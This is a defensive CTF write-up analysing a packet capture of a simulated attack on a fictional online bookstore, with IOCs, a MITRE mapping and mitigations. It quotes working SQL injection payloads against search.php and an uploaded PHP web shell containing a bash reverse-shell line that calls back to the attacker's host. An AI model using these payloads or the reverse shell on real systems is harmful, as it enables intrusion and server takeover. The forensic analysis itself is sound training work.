# CyberDefenders - Web Investigation (PCAP) Write-up

**Challenge:** [Web Investigation](https://cyberdefenders.org/blueteam-ctf-challenges/web-investigation/)  
**Platform:** [CyberDefenders](https://cyberdefenders.org/)  
**Tags:** Network forensics, Wireshark, SQL injection, web shell

---

## Summary

BookWorld’s web server was targeted from **`111.224.250.131`** (**Shijiazhuang**) via **SQL injection** in **`search.php`**. The attacker enumerated **`INFORMATION_SCHEMA`**, identified the **`customer`** table, accessed hidden **`/admin/`**, logged in as **`admin:admin123!`**, and uploaded PHP reverse shell **`NVri2vhp.php`** (bash callback to attacker **TCP/443**).

---

## Scenario

You are a cybersecurity analyst working in the Security Operations Center (SOC) of BookWorld, an expansive online bookstore renowned for its vast selection of literature. BookWorld prides itself on providing a seamless and secure shopping experience for book enthusiasts around the globe. Recently, you've been tasked with reinforcing the company's cybersecurity posture, monitoring network traffic, and ensuring that the digital environment remains safe from threats.

Late one evening, an automated alert is triggered by an unusual spike in database queries and server resource usage, indicating potential malicious activity. This anomaly raises concerns about the integrity of BookWorld's customer data and internal systems, prompting an immediate and thorough investigation.

---

## Objectives

- Analyze network traffic to identify the attack vector and attacker infrastructure.
- Assess scope of data exposure (databases, user tables, credentials).
- Determine post-exploitation access (admin panel, web shell upload).

---

## Environment

- **Artifact:** BookWorld PCAP (lab package)
- **Tools:** Wireshark, [NetworkMiner](https://www.netresec.com/?page=NetworkMiner) (optional), IP geolocation lookup

**Useful Wireshark filters:**

```text
http
http.request.uri contains "search.php"
http.request.uri contains "1=1"
http.request.uri contains "INFORMATION_SCHEMA"
http.request.method == "POST"
http.content_type contains "x-www-form-urlencoded"
http.content_type contains "x-php"
ip.src == 111.224.250.131
```

---

## Evidence & Findings (Wireshark)

### T1 — Attacker IP

**Question:** By knowing the attacker's IP, we can analyze all logs and actions related to that IP and determine the extent of the attack, the duration of the attack, and the techniques used. Can you provide the attacker's IP?

- **What I checked:** HTTP traffic for SQL injection patterns; **Statistics → Conversations → IPv4** for abnormal external talkers.
- **Evidence:** Repeated malicious **`GET /search.php?search=...`** requests sourced from **`111.224.250.131`**. Example (packet **357**):

  ```text
  /search.php?search=book%20and%201=1;%20--%20-
  ```

  Classic boolean-based SQLi (`1=1; --`).

- **Reasoning:** High-volume SQLi from a single external IP identifies the attacker host for timeline reconstruction.

**Answer:** **`111.224.250.131`**

---

### T2 — Attacker origin city

**Question:** If the geographical origin of an IP address is known to be from a region that has no business or expected traffic with our network, this can be an indicator of a targeted attack. Can you determine the origin city of the attacker?

- **What I checked:** IP geolocation lookup for **`111.224.250.131`** (e.g. iplocation.net, MaxMind).
- **Evidence:** Geolocation resolves to **Shijiazhuang**, China.
- **Reasoning:** Unexpected geographic origin vs. BookWorld’s expected customer regions supports targeted/opportunistic attack assessment.

**Answer:** **`Shijiazhuang`**

---

### T3 — Vulnerable PHP script

**Question:** Identifying the exploited script allows security teams to understand exactly which vulnerability was used in the attack. Can you provide the vulnerable PHP script name?

- **What I checked:** HTTP request URIs in SQLi traffic from **`111.224.250.131`**.
- **Evidence:** All injection payloads target **`/search.php`** with the **`search`** parameter.
- **Reasoning:** Unsanitized **`search`** input enables UNION/boolean SQLi — patch **`search.php`** and parameterize queries.

**Answer:** **`search.php`**

---

### T4 — First SQLi request URI (decoded)

**Question:** Establishing the timeline of an attack, starting from the initial exploitation attempt, what is the complete request URI of the first SQLi attempt by the attacker?

- **What I checked:** Filter HTTP from attacker IP; find earliest packet with SQLi indicator (**`1=1`**); URL-decode the URI.
- **Evidence:** Packet **357** — first SQLi attempt:

  ```text
  /search.php?search=book and 1=1; -- -
  ```

  (decoded from `book%20and%201=1;%20--%20-`)

- **Reasoning:** Boolean tautology **`1=1`** with comment terminator **`--`** is a standard first-pass SQLi probe.

**Answer:** **`/search.php?search=book and 1=1; -- -`**

---

### T5 — URI to enumerate databases

**Question:** Can you provide the complete request URI that was used to read the web server's available databases?

- **What I checked:** HTTP requests containing **`INFORMATION_SCHEMA`** / schema enumeration patterns.
- **Evidence:**

  ```text
  /search.php?search=book' UNION ALL SELECT NULL,CONCAT(0x7178766271,JSON_ARRAYAGG(CONCAT_WS(0x7a76676a636b,schema_name)),0x7176706a71) FROM INFORMATION_SCHEMA.SCHEMATA-- -
  ```

  Hex markers **`0x7178766271`** / **`0x7176706a71`** are typical **sqlmap** delimiters for parsing responses.

- **Reasoning:** **UNION** query against **`INFORMATION_SCHEMA.SCHEMATA`** lists all database names on the server.

**Answer:** **`/search.php?search=book' UNION ALL SELECT NULL,CONCAT(0x7178766271,JSON_ARRAYAGG(CONCAT_WS(0x7a76676a636b,schema_name)),0x7176706a71) FROM INFORMATION_SCHEMA.SCHEMATA-- -`**

---

### T6 — Users data table name

**Question:** Assessing the impact of the breach and data access is crucial. What's the table name containing the website users data?

- **What I checked:** HTTP response body following schema/table enumeration (Follow HTTP Stream).
- **Evidence:** Response after enumeration lists tables:

  ```html
  <p>qxvbq["admin", "books", "customers"]qvpjq</p>
  ```

  User/customer data maps to table **`customer`** (lab answer; response array shows **`customers`** — verify against challenge flag format).

- **Reasoning:** Among **`admin`**, **`books`**, and customer-related names, the user-data table is the **customer(s)** store targeted for credential theft.

**Answer:** **`customer`**

---

### T7 — Discovered hidden directory

**Question:** The website directories hidden from the public could serve as an unauthorized access point. Can you provide the name of the directory discovered by the attacker?

- **What I checked:** **`http.request.method == "POST"`** after DB dump; admin login paths.
- **Evidence:** Attacker POSTs to **`/admin/login.php`** after extracting credentials from the database.
- **Reasoning:** **`/admin/`** is a non-public management path — successful login indicates full application compromise.

**Answer:** **`/admin/`**

---

### T8 — Stolen login credentials

**Question:** Knowing which credentials were used allows us to determine the extent of account compromise. What are the credentials used by the attacker for logging in?

- **What I checked:** POST to **`/admin/login.php`** with **`application/x-www-form-urlencoded`** body (Follow HTTP Stream).
- **Evidence:** Form submission contains username **`admin`** and password **`admin123!`**.
- **Reasoning:** Credentials were likely extracted via SQLi from the **`customer`** / admin tables, then reused against the admin panel.

**Answer:** **`admin:admin123!`**

---

### T9 — Uploaded malicious script

**Question:** We need to determine if the attacker gained further access or control of our web server. What's the name of the malicious script uploaded by the attacker?

- **What I checked:** POST requests after admin login; **`Content-Type: application/x-php`** multipart uploads.
- **Evidence:**

  ```text
  Content-Disposition: form-data; name="fileToUpload"; filename="NVri2vhp.php"
  Content-Type: application/x-php

  <?php exec("/bin/bash -c 'bash -i >& /dev/tcp/111.224.250.131/443 0>&1'");?>
  ```

- **Reasoning:** PHP web shell provides interactive **reverse shell** to attacker **`111.224.250.131:443`** — full server compromise beyond DB access.

**Answer:** **`NVri2vhp.php`**

---

## Key IOCs

| Type | Indicator |
|------|-----------|
| **Attacker IP** | `111.224.250.131` |
| **Origin** | Shijiazhuang, China |
| **Vulnerable endpoint** | `/search.php` (`search` param) |
| **Hidden path** | `/admin/`, `/admin/login.php` |
| **Compromised creds** | `admin` / `admin123!` |
| **Web shell** | `NVri2vhp.php` |
| **Reverse shell** | bash → `111.224.250.131:443` |
| **Tool fingerprint** | sqlmap-style UNION markers (`qxvbq` / `qvpjq`) |

---

## Attack reconstruction

```text
[111.224.250.131 — Shijiazhuang]
    |
    +→ SQLi probe: /search.php?search=book and 1=1; -- -
    +→ UNION enumerate INFORMATION_SCHEMA (databases → tables)
    +→ Identify customer user data table
    +→ POST /admin/login.php (admin:admin123!)
    +→ Upload NVri2vhp.php (PHP reverse shell)
    +→ Callback TCP/443 → interactive access
```

---

## MITRE ATT&CK

| Technique | Name | Lab tie-in |
|-----------|------|------------|
| **T1190** | Exploit Public-Facing Application | SQLi in search.php (T3–T5) |
| **T1213** | Data from Information Repositories | Schema/table enumeration (T5–T6) |
| **T1078** | Valid Accounts | admin:admin123! (T8) |
| **T1505.003** | Web Shell | NVri2vhp.php (T9) |
| **T1059.004** | Unix Shell | bash reverse shell in upload |
| **T1071.001** | Web Protocols | HTTP SQLi and file upload |

---

## Mitigation / hardening

1. **Parameterized queries** on **`search.php`** — eliminate string-concatenated SQL.
2. WAF rules for **`UNION`**, **`INFORMATION_SCHEMA`**, **`1=1`**, sqlmap markers.
3. Block **`111.224.250.131`**; rotate **`admin`** password; audit **`customer`** table access logs.
4. Remove **`NVri2vhp.php`**; restrict admin upload paths; disable PHP execution in upload directories.
5. Egress filtering — alert on web servers initiating outbound **TCP/443** reverse shells.

---

## References

- Challenge: https://cyberdefenders.org/blueteam-ctf-challenges/web-investigation/
- MITRE T1190: https://attack.mitre.org/techniques/T1190/
- MITRE T1505.003: https://attack.mitre.org/techniques/T1505/003/
